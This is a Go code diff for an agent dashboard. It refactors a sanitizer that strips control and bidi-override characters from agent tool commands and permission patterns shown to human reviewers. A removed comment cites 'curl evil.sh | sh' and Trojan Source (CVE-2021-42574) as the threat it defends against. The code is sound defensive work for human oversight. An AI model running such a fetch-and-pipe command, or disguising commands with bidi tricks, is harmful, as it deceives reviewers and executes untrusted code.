@@ -17,9 +17,9 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
-	"unicode"
 
 	"github.com/lx-wnk/agent-dashboard/sdk"
+	"github.com/lx-wnk/agent-dashboard/server/internal/sanitize"
 )
 
 const tailBytes = 32768 // 32KB from end
@@ -315,27 +315,6 @@ func toolArgument(raw json.RawMessage) string {
 	return inp.FilePath
 }
 
-// sanitizeForDisplay returns s as a single render-safe line: control,
-// bidi-override and other format runes removed, remaining whitespace collapsed.
-// This text is agent-authored and is read by a human deciding what the agent
-// did: U+202E renders "curl evil.sh | sh" as innocuous reversed text, and a
-// zero-width space hides a word boundary (Trojan Source, CVE-2021-42574).
-// Stripping and collapsing are one step so a caller cannot take the first
-// without the second and put raw newlines in a single-line field.
-func sanitizeForDisplay(s string) string {
-	stripped := strings.Map(func(r rune) rune {
-		if r == '\t' || r == '\n' || r == '\r' {
-			return r // real whitespace; collapsed below
-		}
-		// Bidi controls are all category Cf, so the Cf test alone covers them.
-		if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) {
-			return -1
-		}
-		return r
-	}, s)
-	return strings.Join(strings.Fields(stripped), " ")
-}
-
 // toolDetail is the display form of toolArgument: stripped of characters that
 // can make a command render as a different one, collapsed to one line, and cut
 // so a single entry cannot dominate the list. The second return is how many
@@ -346,17 +325,17 @@ func sanitizeForDisplay(s string) string {
 // "… (+400 chars)" would read as a server-truncated prefix of something longer.
 // The client renders the count as its own element instead.
 func toolDetail(raw json.RawMessage) (string, int) {
-	d := sanitizeForDisplay(toolArgument(raw))
-	if len(d) <= toolDetailMaxLen {
-		return d, 0 // byte length >= rune count, so the cap cannot be exceeded
-	}
-	r := []rune(d)
-	if len(r) > toolDetailMaxLen {
-		// Slice runes, not bytes -- a cut through a multi-byte character yields
-		// U+FFFD on the wire.
-		return string(r[:toolDetailMaxLen]), len(r) - toolDetailMaxLen
-	}
-	return d, 0
+	return sanitize.ForDisplayCapped(toolArgument(raw), toolDetailMaxLen)
+}
+
+// patternDisplayMaxLen bounds the human-facing twin of a grant pattern. Longer
+// than the recent-tool trail's cap because this one is the text someone reads
+// while deciding, but still bounded: it rides on every SSE tick.
+const patternDisplayMaxLen = 400
+
+func patternDisplayOf(pattern string) string {
+	d, _ := sanitize.ForDisplayCapped(pattern, patternDisplayMaxLen)
+	return d
 }
 
 // todoInput is the input shape for TodoWrite tool calls.
@@ -921,8 +900,11 @@ func ParseSessionFile(path string) (*SessionData, error) {
 				Tool: tu.name,
 				// Verbatim: this is the grant identity, matched by exact
 				// equality. The sanitized twin is what a human is shown.
-				Pattern:        pattern,
-				PatternDisplay: sanitizeForDisplay(pattern),
+				Pattern: pattern,
+				// Capped as well as sanitized: the display twin is not the
+				// grant identity, and shipping a multi-kilobyte command twice
+				// on every SSE tick buys nothing a human can read.
+				PatternDisplay: patternDisplayOf(pattern),
 			}
 		}
 	}
